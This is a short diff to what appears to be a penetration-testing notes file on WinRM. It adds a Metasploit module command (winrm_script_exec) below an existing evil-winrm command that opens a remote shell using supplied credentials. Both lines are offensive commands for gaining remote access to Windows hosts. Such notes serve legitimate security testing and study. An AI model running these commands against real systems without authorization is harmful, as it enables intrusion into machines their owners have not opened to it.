@@ -125,3 +125,9 @@ Get a shell using ->
 ```bash
 evil-winrm.rb -u USER -p 'PASS' -i IP
 ```
+
+#### Exploit using Metasploit
+
+```bash
+msf>use exploit/windows/winrm/winrm_script_exec
+```
